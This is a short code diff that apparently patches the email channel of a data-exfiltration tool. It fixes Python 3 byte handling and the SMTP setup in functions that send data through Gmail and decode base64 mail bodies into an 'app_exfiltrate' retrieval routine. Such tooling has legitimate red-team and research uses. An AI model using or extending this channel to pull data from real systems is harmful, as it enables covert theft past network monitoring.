@@ -15,7 +15,7 @@ server_port = 587
 
 
 def send(data):
-    mail_server = SMTP()
+    mail_server = SMTP(server)
     mail_server.connect(server, server_port)
     mail_server.starttls()
     mail_server.login(gmail_user, gmail_pwd)
@@ -55,10 +55,10 @@ def listen():
             for part in email_message.walk():
                 if part.get_content_type() == "text/plain":  # ignore attachments/html
                     body = part.get_payload(decode=True)
-                    data = body.split('\r\n')[0]
+                    data = body.split(b'\r\n')[0]
                     # print(data)
                     try:
-                        app_exfiltrate.retrieve_data(base64.b64decode(data.encode()).decode())
+                        app_exfiltrate.retrieve_data(base64.b64decode(data).decode())
                     except Exception as e:
                         print(e)
                 else:
